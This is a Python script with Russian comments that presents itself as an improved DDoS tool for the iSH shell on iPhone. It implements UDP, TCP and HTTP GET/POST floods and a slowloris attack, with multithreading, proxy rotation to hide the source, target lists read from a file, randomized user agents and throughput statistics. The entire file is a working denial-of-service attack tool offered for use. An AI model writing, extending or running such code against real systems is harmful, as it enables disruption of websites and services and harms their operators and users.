#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Улучшенный DDoS-скрипт для iPhone с ish (или любого Unix).
Поддерживает многопоточность, прокси, атаки на несколько целей,
различные типы флуда и расширенную статистику.
"""

import argparse
import socket
import threading
import time
import random
import sys
import os
from datetime import datetime
import signal
import ssl
import json
import queue
import logging
from urllib.parse import urlparse

# Глобальные флаги и структуры
stop_attack_flag = False
active_threads = 0
total_packets = 0
total_bytes = 0
lock = threading.Lock()
proxy_queue = queue.Queue()
target_queue = queue.Queue()
stats_log = []

# Настройка логирования
logging.basicConfig(
    filename='ddos_attack.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def signal_handler(sig, frame):
    global stop_attack_flag
    logging.info("Получен сигнал остановки")
    print("\n[!] Получен сигнал остановки. Завершаем потоки...")
    stop_attack_flag = True

signal.signal(signal.SIGINT, signal_handler)

class AttackStats:
    """Класс для сбора статистики в реальном времени."""
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
    
    def add_packet(self, size):
        with self.lock:
            self.packets_sent += 1
            self.bytes_sent += size
            total_packets = self.packets_sent
            total_bytes = self.bytes_sent
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                rate = self.packets_sent / elapsed
                bps = self.bytes_sent / elapsed
            else:
                rate = 0
                bps = 0
            return {
                'packets': self.packets_sent,
                'bytes': self.bytes_sent,
                'elapsed': elapsed,
                'rate': rate,
                'bps': bps
            }
    
    def log_stats(self):
        s = self.get_stats()
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'packets': s['packets'],
            'bytes': s['bytes'],
            'elapsed': s['elapsed'],
            'rate': s['rate'],
            'bps': s['bps']
        }
        stats_log.append(log_entry)
        with open('attack_stats.json', 'w') as f:
            json.dump(stats_log, f, indent=2)

stats = AttackStats()

class ProxyManager:
    """Менеджер прокси: загрузка, проверка, ротация."""
    def __init__(self, proxy_file=None, use_proxy=False):
        self.proxies = []
        self.current = 0
        self.use_proxy = use_proxy
        if use_proxy and proxy_file:
            self.load_proxies(proxy_file)
    
    def load_proxies(self, filename):
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(':')
                        if len(parts) == 2:
                            self.proxies.append((parts[0], int(parts[1])))
                        else:
                            logging.warning(f"Неправильный формат прокси: {line}")
            logging.info(f"Загружено {len(self.proxies)} прокси")
        except Exception as e:
            logging.error(f"Ошибка загрузки прокси: {e}")
            self.use_proxy = False
    
    def get_proxy(self):
        if not self.use_proxy or not self.proxies:
            return None
        with lock:
            proxy = self.proxies[self.current]
            self.current = (self.current + 1) % len(self.proxies)
            return proxy

proxy_manager = ProxyManager()

class Target:
    """Класс цели: IP, порт, схема, путь и т.д."""
    def __init__(self, url, port=None):
        self.url = url
        parsed = urlparse(url)
        self.scheme = parsed.scheme or 'http'
        self.netloc = parsed.netloc or url
        self.path = parsed.path or '/'
        if ':' in self.netloc:
            self.host, p = self.netloc.split(':')
            self.port = int(p)
        else:
            self.host = self.netloc
            self.port = port if port else (443 if self.scheme == 'https' else 80)
        try:
            self.ip = socket.gethostbyname(self.host)
        except:
            self.ip = self.host
        self.query = parsed.query
        self.full_path = self.path + ('?' + self.query if self.query else '')
    
    def __str__(self):
        return f"{self.scheme}://{self.host}:{self.port}{self.full_path}"

def udp_flood(target, packet_size, delay, proxy=None):
    """UDP флуд с возможностью использования прокси (UDP прокси редкость, но оставим заглушку)."""
    global stop_attack_flag
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if proxy:
            # Для UDP прокси не реализовано, просто игнорим
            pass
        data = os.urandom(packet_size)
    except:
        return
    
    while not stop_attack_flag:
        try:
            sock.sendto(data, (target.ip, target.port))
            stats.add_packet(packet_size)
        except:
            pass
        if delay > 0:
            time.sleep(delay / 1000.0)

def tcp_flood(target, packet_size, delay, proxy=None):
    """TCP флуд с установкой соединения и отправкой мусора."""
    global stop_attack_flag
    while not stop_attack_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            if proxy:
                # Простой CONNECT прокси для TCP
                proxy_host, proxy_port = proxy
                sock.connect((proxy_host, proxy_port))
                # Отправляем CONNECT запрос
                connect_req = f"CONNECT {target.host}:{target.port} HTTP/1.1\r\n\r\n"
                sock.send(connect_req.encode())
                resp = sock.recv(1024).decode()
                if '200' not in resp:
                    sock.close()
                    continue
            else:
                sock.connect((target.ip, target.port))
            data = os.urandom(packet_size)
            sock.send(data)
            stats.add_packet(packet_size)
            sock.close()
        except:
            pass
        if delay > 0:
            time.sleep(delay / 1000.0)

def http_flood(target, method='GET', delay=0, proxy=None, headers=None):
    """HTTP флуд с разными методами и кастомными заголовками."""
    global stop_attack_flag
    user_agents = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36'
    ]
    if not headers:
        headers = {}
    
    while not stop_attack_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if target.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target.host)
            
            if proxy:
                proxy_host, proxy_port = proxy
                sock.connect((proxy_host, proxy_port))
                # Для HTTPS через прокси нужно CONNECT
                if target.scheme == 'https':
                    connect_req = f"CONNECT {target.host}:{target.port} HTTP/1.1\r\n\r\n"
                    sock.send(connect_req.encode())
                    resp = sock.recv(1024).decode()
                    if '200' not in resp:
                        sock.close()
                        continue
                    # Далее уже шифрованный туннель
                else:
                    # Для HTTP используем обычный прокси
                    pass
            else:
                sock.connect((target.ip, target.port))
            
            # Формируем запрос
            path = target.full_path
            ua = random.choice(user_agents)
            default_headers = {
                'Host': target.host,
                'User-Agent': ua,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive'
            }
            default_headers.update(headers)
            
            if method.upper() == 'GET':
                request = f"GET {path} HTTP/1.1\r\n"
                for key, value in default_headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
            elif method.upper() == 'POST':
                data = os.urandom(128).hex()
                default_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                default_headers['Content-Length'] = len(data)
                request = f"POST {path} HTTP/1.1\r\n"
                for key, value in default_headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
                request += data
            elif method.upper() == 'HEAD':
                request = f"HEAD {path} HTTP/1.1\r\n"
                for key, value in default_headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
            else:
                # Случайный метод
                rand_method = random.choice(['GET', 'POST', 'HEAD', 'PUT', 'DELETE'])
                return http_flood(target, rand_method, delay, proxy, headers)
            
            sock.send(request.encode())
            stats.add_packet(len(request))
            # Если нужно читать ответ (для slowloris стиля), но не обязательно
            try:
                sock.recv(1024)
            except:
                pass
            sock.close()
        except Exception as e:
            logging.debug(f"HTTP error: {e}")
        if delay > 0:
            time.sleep(delay / 1000.0)

def slowloris(target, sockets_count=200, proxy=None):
    """Slowloris: держит соединения открытыми, периодически отправляя заголовки."""
    global stop_attack_flag
    sockets = []
    # Создаём пул сокетов
    for _ in range(sockets_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            if proxy:
                proxy_host, proxy_port = proxy
                sock.connect((proxy_host, proxy_port))
                connect_req = f"CONNECT {target.host}:{target.port} HTTP/1.1\r\n\r\n"
                sock.send(connect_req.encode())
                resp = sock.recv(1024).decode()
                if '200' not in resp:
                    sock.close()
                    continue
            else:
                sock.connect((target.ip, target.port))
            # Отправляем начало запроса
            request = f"GET {target.full_path} HTTP/1.1\r\nHost: {target.host}\r\n"
            sock.send(request.encode())
            sockets.append(sock)
        except:
            pass
    
    # Поддерживаем соединения
    while not stop_attack_flag and sockets:
        for sock in sockets[:]:
            try:
                # Отправляем случайный заголовок
                header = f"X-Random-{random.randint(1,9999)}: {os.urandom(8).hex()}\r\n"
                sock.send(header.encode())
                stats.add_packet(len(header))
            except:
                sockets.remove(sock)
                # Пытаемся переоткрыть
                try:
                    nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    nsock.settimeout(4)
                    if proxy:
                        nsock.connect((proxy_host, proxy_port))
                        connect_req = f"CONNECT {target.host}:{target.port} HTTP/1.1\r\n\r\n"
                        nsock.send(connect_req.encode())
                        resp = nsock.recv(1024).decode()
                        if '200' not in resp:
                            nsock.close()
                            continue
                    else:
                        nsock.connect((target.ip, target.port))
                    nsock.send(request.encode())
                    sockets.append(nsock)
                except:
                    pass
        time.sleep(10)

def worker(target, attack_type, packet_size, delay, threads_per_worker, proxy=None):
    """Запускает указанное количество потоков одного типа атаки для конкретной цели."""
    global active_threads, stop_attack_flag
    threads = []
    for _ in range(threads_per_worker):
        if stop_attack_flag:
            break
        if attack_type == 'udp':
            t = threading.Thread(target=udp_flood, args=(target, packet_size, delay, proxy))
        elif attack_type == 'tcp':
            t = threading.Thread(target=tcp_flood, args=(target, packet_size, delay, proxy))
        elif attack_type == 'http':
            t = threading.Thread(target=http_flood, args=(target, 'GET', delay, proxy))
        elif attack_type == 'http_post':
            t = threading.Thread(target=http_flood, args=(target, 'POST', delay, proxy))
        elif attack_type == 'slowloris':
            t = threading.Thread(target=slowloris, args=(target, 100, proxy))
        else:
            logging.error(f"Неизвестный тип атаки: {attack_type}")
            return
        t.daemon = True
        t.start()
        threads.append(t)
        with lock:
            active_threads += 1
    for t in threads:
        t.join()
        with lock:
            active_threads -= 1

def stats_printer(interval=5):
    """Поток для вывода статистики каждые interval секунд."""
    global stop_attack_flag
    while not stop_attack_flag:
        time.sleep(interval)
        s = stats.get_stats()
        print(f"\r[>] Packets: {s['packets']} | Rate: {s['rate']:.2f} pps | Bandwidth: {s['bps']/1024:.2f} KB/s | Elapsed: {s['elapsed']:.1f}s", end='', flush=True)
        stats.log_stats()
    print()

def load_targets(target_file):
    """Загружает цели из файла (по одной строке)."""
    targets = []
    try:
        with open(target_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    targets.append(Target(line))
        logging.info(f"Загружено {len(targets)} целей из {target_file}")
    except Exception as e:
        logging.error(f"Ошибка загрузки целей: {e}")
    return targets

def main():
    parser = argparse.ArgumentParser(description='Улучшенный DDoS-скрипт для iPhone ish (многопоточный, с прокси)')
    parser.add_argument('target', nargs='?', help='Целевой IP адрес или домен (если не указан, используется --targets)')
    parser.add_argument('-p', '--port', type=int, default=None, help='Целевой порт (по умолчанию 80 для http, 443 для https)')
    parser.add_argument('-t', '--type', choices=['udp', 'tcp', 'http', 'http_post', 'slowloris', 'all'], default='udp', help='Тип атаки (по умолчанию udp)')
    parser.add_argument('-T', '--threads', type=int, default=50, help='Общее количество потоков (по умолчанию 50)')
    parser.add_argument('-s', '--size', type=int, default=1024, help='Размер пакета в байтах (по умолчанию 1024)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Задержка между пакетами в миллисекундах (0 - без задержки)')
    parser.add_argument('--duration', type=int, default=0, help='Длительность атаки в секундах (0 - бесконечно, до Ctrl+C)')
    parser.add_argument('--stats-interval', type=int, default=5, help='Интервал вывода статистики (сек)')
    parser.add_argument('--targets', help='Файл со списком целей (по одной строке)')
    parser.add_argument('--proxy-file', help='Файл со списком прокси (формат ip:port)')
    parser.add_argument('--random-agent', action='store_true', help='Использовать случайный User-Agent для HTTP')
    parser.add_argument('--method', default='GET', choices=['GET', 'POST', 'HEAD', 'RANDOM'], help='HTTP метод для флуда')
    parser.add_argument('--headers', help='JSON-строка с дополнительными заголовками, например \'{"X-Forwarded-For": "127.0.0.1"}\'')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Отключить проверку SSL сертификатов')
    
    args = parser.parse_args()
    
    if not args.target and not args.targets:
        print("[-] Не указана цель. Используйте target или --targets")
        sys.exit(1)
    
    # Загрузка прокси
    if args.proxy_file:
        proxy_manager.use_proxy = True
        proxy_manager.load_proxies(args.proxy_file)
    
    # Загрузка целей
    targets = []
    if args.targets:
        targets = load_targets(args.targets)
    if args.target:
        port = args.port if args.port else None
        targets.append(Target(args.target, port))
    
    if not targets:
        print("[-] Нет целей для атаки")
        sys.exit(1)
    
    # Дополнительные заголовки
    extra_headers = {}
    if args.headers:
        try:
            extra_headers = json.loads(args.headers)
        except:
            print("[-] Неправильный формат --headers, ожидается JSON")
            sys.exit(1)
    
    # Отключаем проверку SSL если нужно
    if args.no_ssl_verify:
        ssl._create_default_https_context = ssl._create_unverified_context
    
    print(f"[+] Начало атаки. Целей: {len(targets)}")
    for t in targets:
        print(f"    {t}")
    print(f"[+] Тип: {args.type}, потоков: {args.threads}, размер пакета: {args.size}, задержка: {args.delay} мс")
    if args.duration > 0:
        print(f"[+] Длительность: {args.duration} секунд")
    else:
        print("[+] Для остановки нажмите Ctrl+C")
    
    global stop_attack_flag
    stop_attack_flag = False
    
    # Запуск статистики
    stats_thread = threading.Thread(target=stats_printer, args=(args.stats_interval,))
    stats_thread.daemon = True
    stats_thread.start()
    
    # Распределение потоков по типам атаки и целям
    # Для простоты: равномерно распределяем потоки между целями и типами
    total_targets = len(targets)
    if args.type == 'all':
        attack_types = ['udp', 'tcp', 'http', 'slowloris']
    else:
        attack_types = [args.type]
    
    # Рассчитываем количество потоков на цель и на тип
    threads_per_target = max(1, args.threads // total_targets)
    remaining_threads = args.threads - threads_per_target * total_targets
    
    workers = []
    for idx, target in enumerate(targets):
        # Для этой цели распределяем потоки по типам
        if args.type == 'all':
            types_for_target = attack_types
            per_type = max(1, threads_per_target // len(types_for_target))
            remaining = threads_per_target - per_type * len(types_for_target)
            for atype in types_for_target:
                cnt = per_type + (1 if remaining > 0 else 0)
                remaining -= 1
                proxy = proxy_manager.get_proxy() if proxy_manager.use_proxy else None
                print(f"[+] Цель {target.host}:{target.port} запускаю {cnt} потоков типа {atype}" + (" через прокси" if proxy else ""))
                w = threading.Thread(target=worker, args=(target, atype, args.size, args.delay, cnt, proxy))
                w.daemon = True
                w.start()
                workers.append(w)
        else:
            # Один тип
            cnt = threads_per_target
            proxy = proxy_manager.get_proxy() if proxy_manager.use_proxy else None
            print(f"[+] Цель {target.host}:{target.port} запускаю {cnt} потоков типа {args.type}" + (" через прокси" if proxy else ""))
            w = threading.Thread(target=worker, args=(target, args.type, args.size, args.delay, cnt, proxy))
            w.daemon = True
            w.start()
            workers.append(w)
    
    # Обработка оставшихся потоков (если есть)
    # Добавляем их к первой цели или распределяем
    if remaining_threads > 0 and targets:
        target = targets[0]
        cnt = remaining_threads
        atype = args.type if args.type != 'all' else 'http'
        proxy = proxy_manager.get_proxy() if proxy_manager.use_proxy else None
        print(f"[+] Дополнительно {cnt} потоков типа {atype} на {target.host}")
        w = threading.Thread(target=worker, args=(target, atype, args.size, args.delay, cnt, proxy))
        w.daemon = True
        w.start()
        workers.append(w)
    
    # Ждём указанное время или до прерывания
    if args.duration > 0:
        time.sleep(args.duration)
        stop_attack_flag = True
    else:
        try:
            while not stop_attack_flag:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Получен сигнал остановки...")
            stop_attack_flag = True
    
    # Ждём завершения всех потоков
    for w in workers:
        w.join(timeout=2)
    
    # Финальная статистика
    s = stats.get_stats()
    print("\n[+] Атака завершена.")
    print(f"[+] Всего отправлено пакетов: {s['packets']}")
    print(f"[+] Всего отправлено данных: {s['bytes']} байт ({s['bytes']/1024/1024:.2f} MB)")
    print(f"[+] Средняя скорость: {s['rate']:.2f} пакетов/с, {s['bps']/1024/1024:.2f} MB/s")
    logging.info(f"Атака завершена. Пакетов: {s['packets']}, байт: {s['bytes']}")

if __name__ == '__main__':
    main()
